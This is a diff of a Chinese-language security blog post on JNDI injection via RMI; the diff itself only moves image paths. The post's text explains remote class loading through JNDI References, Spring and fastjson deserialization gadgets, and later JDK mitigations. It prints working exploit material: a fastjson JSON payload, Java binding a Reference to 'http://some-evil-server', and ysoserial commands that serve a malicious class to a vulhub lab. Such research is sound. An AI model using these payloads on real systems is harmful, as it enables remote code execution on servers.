@@ -20,33 +20,33 @@
 <meta property="og:site_name" content="0kami&#39;s Blog">
 <meta property="og:description" content="0x00 前言在现实环境中，遇到RMI Registry的机会很少，而结合反序列化漏洞的JNDI注入则常见了许多。本文将介绍RMI结合JNDI后可以做哪些事情XD">
 <meta property="og:locale" content="en">
-<meta property="og:image" content="http://blog.0kami.cn/2020/02/09/java/jndi-with-rmi/image-20200204162708130-1255889.png">
-<meta property="og:image" content="http://blog.0kami.cn/2020/02/09/java/jndi-with-rmi/image-20200204164815153-1255889.png">
-<meta property="og:image" content="http://blog.0kami.cn/2020/02/09/java/jndi-with-rmi/image-20200204203703902-1255889.png">
-<meta property="og:image" content="http://blog.0kami.cn/2020/02/09/java/jndi-with-rmi/image-20200204204303412-1255889.png">
-<meta property="og:image" content="http://blog.0kami.cn/2020/02/09/java/jndi-with-rmi/image-20200204204444118-1255889.png">
-<meta property="og:image" content="http://blog.0kami.cn/2020/02/09/java/jndi-with-rmi/image-20200204205121493-1255889.png">
-<meta property="og:image" content="http://blog.0kami.cn/2020/02/09/java/jndi-with-rmi/image-20200204205638427-1255889.png">
-<meta property="og:image" content="http://blog.0kami.cn/2020/02/09/java/jndi-with-rmi/image-20200204210107747-1255889.png">
-<meta property="og:image" content="http://blog.0kami.cn/2020/02/09/java/jndi-with-rmi/image-20200204210025714-1255889.png">
-<meta property="og:image" content="http://blog.0kami.cn/2020/02/09/java/jndi-with-rmi/image-20200205222725185-1255889.png">
-<meta property="og:image" content="http://blog.0kami.cn/2020/02/09/java/jndi-with-rmi/image-20200205222908751-1255889.png">
-<meta property="og:image" content="http://blog.0kami.cn/2020/02/09/java/jndi-with-rmi/image-20200205223002181-1255889.png">
-<meta property="og:image" content="http://blog.0kami.cn/2020/02/09/java/jndi-with-rmi/image-20200205223116317-1255889.png">
-<meta property="og:image" content="http://blog.0kami.cn/2020/02/09/java/jndi-with-rmi/image-20200205125555341-1255889.png">
-<meta property="og:image" content="http://blog.0kami.cn/2020/02/09/java/jndi-with-rmi/image-20200205125714780-1255889.png">
-<meta property="og:image" content="http://blog.0kami.cn/2020/02/09/java/jndi-with-rmi/image-20200205154116235-1255889.png">
-<meta property="og:image" content="http://blog.0kami.cn/2020/02/09/java/jndi-with-rmi/image-20200205154412920-1255889.png">
-<meta property="og:image" content="http://blog.0kami.cn/2020/02/09/java/jndi-with-rmi/image-20200205155851653-1255889.png">
-<meta property="og:image" content="http://blog.0kami.cn/2020/02/09/java/jndi-with-rmi/image-20200206144653206-1255889.png">
-<meta property="og:image" content="http://blog.0kami.cn/2020/02/09/java/jndi-with-rmi/image-20200206144749240-1255889.png">
-<meta property="og:image" content="http://blog.0kami.cn/2020/02/09/java/jndi-with-rmi/image-20200206144824977-1255889.png">
-<meta property="og:image" content="http://blog.0kami.cn/2020/02/09/java/jndi-with-rmi/image-20200206163723977-1255889.png">
-<meta property="og:updated_time" content="2020-11-18T14:05:13.072Z">
+<meta property="og:image" content="http://blog.0kami.cn/images/jndi-with-rmi-20200209/image-20200204162708130-1255889.png">
+<meta property="og:image" content="http://blog.0kami.cn/images/jndi-with-rmi-20200209/image-20200204164815153-1255889.png">
+<meta property="og:image" content="http://blog.0kami.cn/images/jndi-with-rmi-20200209/image-20200204203703902-1255889.png">
+<meta property="og:image" content="http://blog.0kami.cn/images/jndi-with-rmi-20200209/image-20200204204303412-1255889.png">
+<meta property="og:image" content="http://blog.0kami.cn/images/jndi-with-rmi-20200209/image-20200204204444118-1255889.png">
+<meta property="og:image" content="http://blog.0kami.cn/images/jndi-with-rmi-20200209/image-20200204205121493-1255889.png">
+<meta property="og:image" content="http://blog.0kami.cn/images/jndi-with-rmi-20200209/image-20200204205638427-1255889.png">
+<meta property="og:image" content="http://blog.0kami.cn/images/jndi-with-rmi-20200209/image-20200204210107747-1255889.png">
+<meta property="og:image" content="http://blog.0kami.cn/images/jndi-with-rmi-20200209/image-20200204210025714-1255889.png">
+<meta property="og:image" content="http://blog.0kami.cn/images/jndi-with-rmi-20200209/image-20200205222725185-1255889.png">
+<meta property="og:image" content="http://blog.0kami.cn/images/jndi-with-rmi-20200209/image-20200205222908751-1255889.png">
+<meta property="og:image" content="http://blog.0kami.cn/images/jndi-with-rmi-20200209/image-20200205223002181-1255889.png">
+<meta property="og:image" content="http://blog.0kami.cn/images/jndi-with-rmi-20200209/image-20200205223116317-1255889.png">
+<meta property="og:image" content="http://blog.0kami.cn/images/jndi-with-rmi-20200209/image-20200205125555341-1255889.png">
+<meta property="og:image" content="http://blog.0kami.cn/images/jndi-with-rmi-20200209/image-20200205125714780-1255889.png">
+<meta property="og:image" content="http://blog.0kami.cn/images/jndi-with-rmi-20200209/image-20200205154116235-1255889.png">
+<meta property="og:image" content="http://blog.0kami.cn/images/jndi-with-rmi-20200209/image-20200205154412920-1255889.png">
+<meta property="og:image" content="http://blog.0kami.cn/images/jndi-with-rmi-20200209/image-20200205155851653-1255889.png">
+<meta property="og:image" content="http://blog.0kami.cn/images/jndi-with-rmi-20200209/image-20200206144653206-1255889.png">
+<meta property="og:image" content="http://blog.0kami.cn/images/jndi-with-rmi-20200209/image-20200206144749240-1255889.png">
+<meta property="og:image" content="http://blog.0kami.cn/images/jndi-with-rmi-20200209/image-20200206144824977-1255889.png">
+<meta property="og:image" content="http://blog.0kami.cn/images/jndi-with-rmi-20200209/image-20200206163723977-1255889.png">
+<meta property="og:updated_time" content="2020-11-18T14:29:18.865Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="【notes】JNDI with RMI">
 <meta name="twitter:description" content="0x00 前言在现实环境中，遇到RMI Registry的机会很少，而结合反序列化漏洞的JNDI注入则常见了许多。本文将介绍RMI结合JNDI后可以做哪些事情XD">
-<meta name="twitter:image" content="http://blog.0kami.cn/2020/02/09/java/jndi-with-rmi/image-20200204162708130-1255889.png">
+<meta name="twitter:image" content="http://blog.0kami.cn/images/jndi-with-rmi-20200209/image-20200204162708130-1255889.png">
 
   <link href="https://fonts.googleapis.com/css?family=Inconsolata|Titillium+Web" rel="stylesheet">
   <link href="https://fonts.googleapis.com/css?family=Roboto+Mono" rel="stylesheet">
@@ -188,7 +188,7 @@
 <p><a href="https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE-wp.pdf" target="_blank" rel="noopener">https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE-wp.pdf</a></p>
 </blockquote>
 <p>JNDI方便了与naming service和Directory service的交互，通过指定特定的URL即可与不同的服务进行交互。相当于对这些服务的API又进行了一次封装供开发人员使用。其中JNDI中也存在上述RMI codebase的动态加载机制，并且其配置同底层的RMI配置并不相关。</p>
-<p><img src="image-20200204162708130-1255889.png" alt="image-20200204162708130"></p>
+<p><img src="/images/jndi-with-rmi-20200209/image-20200204162708130-1255889.png" alt="image-20200204162708130"></p>
 <p>从上述的构架来看，动态加载发生于两个部分，Naming Manager和JNDI SPI。这里SPI部分就是相对应的服务的配置，比如前文提到的RMI的限制就是SPI部分的。而Naming Manager也存在一个动态加载机制并且其在修复前并无限制，这里Naming Manager部分用到的是JNDI的Naming References</p>
 <blockquote>
 <p>In order to bind Java objects in a Naming or Directory service, it is possible to use Java serialization to get the byte array representation of an object at a given state. However, it is not always possible to bind the serialized state of an object because it might be too large or it might be inadequate.</p>
@@ -198,7 +198,7 @@
 <p>这里提到由于某些情况不能直接将远程obj返回，所以JNDI提出了Naming References的方法，返回相应的Reference而不返回具体的obj。统一由JNDI的请求端去加载指定的地址上的obj。这里加载方法中就包括远程codebase的方法，来看个例子</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">String FactoryURL = <span class="string">"http://some-evil-server"</span>;</span><br><span class="line">Reference reference = <span class="keyword">new</span> Reference(<span class="string">"MyClass"</span>,<span class="string">"MyClass"</span>,FactoryURL);</span><br><span class="line">ReferenceWrapper wrapper = <span class="keyword">new</span> ReferenceWrapper(reference);</span><br><span class="line">ctx.bind(<span class="string">"Foo"</span>, wrapper);<span class="comment">// 绑定reference</span></span><br></pre></td></tr></table></figure>
 <p>请求端以lookup请求上述绑定的RMI服务即可。其处理过程引用<a href="https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE-wp.pdf" target="_blank" rel="noopener">https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE-wp.pdf</a></p>
-<p><img src="image-20200204164815153-1255889.png" alt="image-20200204164815153"></p>
+<p><img src="/images/jndi-with-rmi-20200209/image-20200204164815153-1255889.png" alt="image-20200204164815153"></p>
 <h2 id="0x02-原理"><a href="#0x02-原理" class="headerlink" title="0x02 原理"></a>0x02 原理</h2><h3 id="JNDI-with-RMI-DEMO"><a href="#JNDI-with-RMI-DEMO" class="headerlink" title="JNDI with RMI DEMO"></a>JNDI with RMI DEMO</h3><p>为了更好的说明，以下面的代码为例</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> train.jndi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> wh1t3P1g</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> 2020/2/4</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Server</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Registry registry = LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line"></span><br><span class="line">        String FactoryURL = <span class="string">"http://localhost/"</span>;</span><br><span class="line">        Reference reference = <span class="keyword">new</span> Reference(<span class="string">"EvilObj"</span>,<span class="string">"EvilObj"</span>,FactoryURL);</span><br><span class="line">        ReferenceWrapper wrapper = <span class="keyword">new</span> ReferenceWrapper(reference);</span><br><span class="line">        registry.bind(<span class="string">"Foo"</span>, wrapper);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>Server端以RMI Registry注册一个Reference，并将factoryURL指定为localhost</p>
@@ -208,47 +208,47 @@
 <p><code>javac EvilObj.java</code>生成EvilObj.class，然后挂载到一个web服务上就可以了。可以直接选择python来挂载</p>
 <p>那么我们来具体看一下lookup函数具体做了什么</p>
 <p>首先InitialContext的lookup函数，会根据提供的URL自动选择合适的InitialContext（分离出协议后进行选择），比如此时的InitialContext为rmiURLContext</p>
-<p><img src="image-20200204203703902-1255889.png" alt="image-20200204203703902"></p>
+<p><img src="/images/jndi-with-rmi-20200209/image-20200204203703902-1255889.png" alt="image-20200204203703902"></p>
 <p>继续跟进<code>com/sun/jndi/toolkit/url/GenericURLContext.java#lookup</code></p>
-<p><img src="image-20200204204303412-1255889.png" alt="image-20200204204303412"></p>
+<p><img src="/images/jndi-with-rmi-20200209/image-20200204204303412-1255889.png" alt="image-20200204204303412"></p>
 <p>这里的ctx为RegistryContext，将对指定的RMI Registry获取绑定的obj</p>
-<p><img src="image-20200204204444118-1255889.png" alt="image-20200204204444118"></p>
+<p><img src="/images/jndi-with-rmi-20200209/image-20200204204444118-1255889.png" alt="image-20200204204444118"></p>
 <p>获取到远程对象，并调用decodeObject函数</p>
-<p><img src="image-20200204205121493-1255889.png" alt="image-20200204205121493"></p>
+<p><img src="/images/jndi-with-rmi-20200209/image-20200204205121493-1255889.png" alt="image-20200204205121493"></p>
 <p>如果当前的remote对象是RemoteReference类型，则进一步请求Registry获取该Reference的内容。到这里为止，我们接下来的请求就同Server端的关系不大了，Client会根据拿到的Reference请求相应的服务器</p>
 <p>继续跟进getObjectInstance</p>
-<p><img src="image-20200204205638427-1255889.png" alt="image-20200204205638427"></p>
+<p><img src="/images/jndi-with-rmi-20200209/image-20200204205638427-1255889.png" alt="image-20200204205638427"></p>
 <p>这里会继续调用NamingManager的getObjectFactoryFromReference，该函数完成了向FactoryURL请求具体的class文件的功能。</p>
-<p><img src="image-20200204210107747-1255889.png" alt="image-20200204210107747"></p>
+<p><img src="/images/jndi-with-rmi-20200209/image-20200204210107747-1255889.png" alt="image-20200204210107747"></p>
 <p>这里可以看到，根据factoryName和codebase将远程载入相应的class文件(这里的loadClass用的URLClassLoader来完成任务)</p>
-<p><img src="image-20200204210025714-1255889.png" alt="image-20200204210025714"></p>
+<p><img src="/images/jndi-with-rmi-20200209/image-20200204210025714-1255889.png" alt="image-20200204210025714"></p>
 <p>并在第163行对载入的obj进行初始化，这也就是为什么我们需要把payload写在构造函数里。</p>
 <p>在利用中，lookup函数的参数必须是可控的，或者利用反序列化利用链的方式来完成，比如下面的两个案例</p>
 <h3 id="案例一：Spring框架的JtaTransactionManager类"><a href="#案例一：Spring框架的JtaTransactionManager类" class="headerlink" title="案例一：Spring框架的JtaTransactionManager类"></a>案例一：Spring框架的JtaTransactionManager类</h3><p>16年的时候Spring框架暴了一个反序列化的可利用点JtaTransactionManager，其原理就是利用了JNDI 可控的lookup参数（这里的可控由反序列化来完成）。来看一下原理</p>
 <p><code>org/springframework/transaction/jta/JtaTransactionManager.java#readObject</code></p>
-<p><img src="image-20200205222725185-1255889.png" alt="image-20200205222725185"></p>
+<p><img src="/images/jndi-with-rmi-20200209/image-20200205222725185-1255889.png" alt="image-20200205222725185"></p>
 <p>这里1230行初始化了一个jdni的context，这个context将用于后续的JNDI lookup</p>
 <p>继续跟进initUserTransactionAndTranscationManager</p>
-<p><img src="image-20200205222908751-1255889.png" alt="image-20200205222908751"></p>
+<p><img src="/images/jndi-with-rmi-20200209/image-20200205222908751-1255889.png" alt="image-20200205222908751"></p>
 <p>继续跟进lookupUserTransaction</p>
-<p><img src="image-20200205223002181-1255889.png" alt="image-20200205223002181"></p>
+<p><img src="/images/jndi-with-rmi-20200209/image-20200205223002181-1255889.png" alt="image-20200205223002181"></p>
 <p>这里最终调用了context的lookup函数，并且其参数为userTransactionName，这个部分我们可以在序列化前进行构造，例如下面的代码(更新在了ysoserial的spring3上)</p>
-<p><img src="image-20200205223116317-1255889.png" alt="image-20200205223116317"></p>
+<p><img src="/images/jndi-with-rmi-20200209/image-20200205223116317-1255889.png" alt="image-20200205223116317"></p>
 <p>到了如今2020年，这个类的利用仍然存在于最新版的Spring-tx组件上XD</p>
 <h3 id="案例二：FastJSON反序列化POC-JdbcRowSetImpl类"><a href="#案例二：FastJSON反序列化POC-JdbcRowSetImpl类" class="headerlink" title="案例二：FastJSON反序列化POC JdbcRowSetImpl类"></a>案例二：FastJSON反序列化POC JdbcRowSetImpl类</h3><p>fastjson由于<code>@type</code>的存在，在受影响的版本中，其可以对任意指定的对象进行反序列化，根据规则自动调用setter/getter来达到实例还原的目的。首先来看一下POC</p>
 <figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">"@type"</span>:<span class="string">"com.sun.rowset.JdbcRowSetImpl"</span>,<span class="attr">"dataSourceName"</span>:<span class="string">"rmi://localhost:1099/obj"</span>,<span class="attr">"autoCommit"</span>:<span class="literal">true</span>&#125;</span><br></pre></td></tr></table></figure>
 <p>这里的关键在于autoCommit，来看一下JdbcRowSetImpl的setAutoCommit函数</p>
-<p><img src="image-20200205125555341-1255889.png" alt="image-20200205125555341"></p>
+<p><img src="/images/jndi-with-rmi-20200209/image-20200205125555341-1255889.png" alt="image-20200205125555341"></p>
 <p>这里如果conn为null的话，会调用connect函数，看一下connect函数</p>
-<p><img src="image-20200205125714780-1255889.png" alt="image-20200205125714780"></p>
+<p><img src="/images/jndi-with-rmi-20200209/image-20200205125714780-1255889.png" alt="image-20200205125714780"></p>
 <p>看到这里用JNDI进行数据库连接，并且由于fastjson的特性dataSource是可控的，这就意味着我们可以控制lookup的参数，并向恶意的server发起JNDI连接。根据前文说的原理，我们可以使得主机执行任意代码。</p>
 <h2 id="0x03-环境复现"><a href="#0x03-环境复现" class="headerlink" title="0x03 环境复现"></a>0x03 环境复现</h2><h3 id="改造JRMPListener"><a href="#改造JRMPListener" class="headerlink" title="改造JRMPListener"></a>改造JRMPListener</h3><p>由于JNDI底层用的都是RMI的东西，所以我们要建立一个绑定了Reference的RMI服务，可以直接改改JRMPListener。</p>
 <p>在RMI部分曾经分析过JRMPListener，其返回了ExceptionalReturn，使得构造好的Exception在Client反序列化执行命令。而对于绑定Reference，我们需要修改ExceptionalReturn为NormalReturn并将payloadObject改为ReferenceWrapper</p>
-<p><img src="image-20200205154116235-1255889.png" alt="image-20200205154116235"></p>
+<p><img src="/images/jndi-with-rmi-20200209/image-20200205154116235-1255889.png" alt="image-20200205154116235"></p>
 <p>payloadObject改为ReferenceWrapper</p>
-<p><img src="image-20200205154412920-1255889.png" alt="image-20200205154412920"></p>
+<p><img src="/images/jndi-with-rmi-20200209/image-20200205154412920-1255889.png" alt="image-20200205154412920"></p>
 <p>但是在实际测试时，发现Client请求后不能完全退出。其实我们也可以直接用上面的例子</p>
-<p><img src="image-20200205155851653-1255889.png" alt="image-20200205155851653"></p>
+<p><img src="/images/jndi-with-rmi-20200209/image-20200205155851653-1255889.png" alt="image-20200205155851653"></p>
 <p>不过这里就获取不到是否有访问进来，根据实际的环境取舍吧XD</p>
 <p>改造后的已更新到<a href="https://github.com/wh1t3p1g/ysoserial" target="_blank" rel="noopener">github</a>上</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">// 开启挂载了evil class文件的HTTP Server</span><br><span class="line">java -cp target/ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.PayloadHTTPServer 80 EvilObj <span class="string">"open /System/Applications/Calculator.app"</span></span><br><span class="line"></span><br><span class="line">// 开启RMI Reference Listener</span><br><span class="line">java -cp target/ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.RMIRefListener 1099 EvilObj http://localhost/</span><br><span class="line"></span><br><span class="line">// 或者使用RMIRefListener2，集合了上面两个步骤</span><br><span class="line">java -cp target/ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.RMIRefListener2 localhost:1099 80 EvilObj <span class="string">"open /System/Applications/Calculator.app"</span></span><br></pre></td></tr></table></figure>
@@ -256,11 +256,11 @@
 <p>首先开启一个evil rmi server</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.RMIRefListener2 host:1099 80 EvilObj <span class="string">"touch /tmp/success"</span></span><br></pre></td></tr></table></figure>
 <p>用<a href="https://github.com/vulhub/vulhub/blob/master/fastjson/1.2.24-rce/README.md" target="_blank" rel="noopener">vulhub</a>的环境</p>
-<p><img src="image-20200206144653206-1255889.png" alt="image-20200206144653206"></p>
+<p><img src="/images/jndi-with-rmi-20200209/image-20200206144653206-1255889.png" alt="image-20200206144653206"></p>
 <p>在服务器端会接收到连接</p>
-<p><img src="image-20200206144749240-1255889.png" alt="image-20200206144749240"></p>
+<p><img src="/images/jndi-with-rmi-20200209/image-20200206144749240-1255889.png" alt="image-20200206144749240"></p>
 <p>进到docker里可以看到生成了success文件</p>
-<p><img src="image-20200206144824977-1255889.png" alt="image-20200206144824977"></p>
+<p><img src="/images/jndi-with-rmi-20200209/image-20200206144824977-1255889.png" alt="image-20200206144824977"></p>
 <h2 id="0x04-后续"><a href="#0x04-后续" class="headerlink" title="0x04 后续"></a>0x04 后续</h2><p>前文用的环境是JDK8u111，在后续的JDK8u113以及JDK6u132, JDK7u122之后增加了对远程codebase的限制</p>
 <blockquote>
 <p>系统属性 com.sun.jndi.rmi.object.trustURLCodebase、com.sun.jndi.cosnaming.object.trustURLCodebase 的默认值变为false，即默认不允许从远程的Codebase加载Reference工厂类。如果需要开启 RMI Registry 或者 COS Naming Service Provider的远程类加载功能，需要将前面说的两个属性值设置为true。</p>
@@ -285,7 +285,7 @@
 <p>我在<a href="http://blog.0kami.cn/2020/02/06/rmi-registry-security-problem/">浅谈Java RMI反序列化问题</a>中曾提到过，JRMPListener利用的是RMI Client在接收Exception时发生的反序列化漏洞。而这里的JNDI底层用的仍然是RMI那套(如果协议是RMI的话)，所以我们发起一个链接到ysoserial的JRMPListener也还是能成功利用的，不管有没有设置<code>com.sun.jndi.rmi.object.trustURLCodebase</code>为true。当然如果要利用成功，发起端必须要有反序列化利用链所依赖的组件并且合适的JDK版本才可以。</p>
 <h3 id="利用可利用的本地Factory对象"><a href="#利用可利用的本地Factory对象" class="headerlink" title="利用可利用的本地Factory对象"></a>利用可利用的本地Factory对象</h3><p>然后我们来继续看看第一种情况</p>
 <p>在前面分析NamingManager的getObjectFactoryFromReference时，我略过了本地的factory的载入部分的代码</p>
-<p><img src="image-20200206163723977-1255889.png" alt="image-20200206163723977"></p>
+<p><img src="/images/jndi-with-rmi-20200209/image-20200206163723977-1255889.png" alt="image-20200206163723977"></p>
 <p>这里首先会在本地的CLASSPATH里找这个factoryName，如果找到了，后续就不用进行远程加载。所以如果本地可以找到一个可利用的factory，也能突破JNDI的远程加载的限制。</p>
 <p>前面的文章中提到了tomcat（或glassfish）中的BeanFactory的利用，来分析一下</p>
 <p>首先在后续的调用中，factory的getObjectInstance函数将会被调用</p>
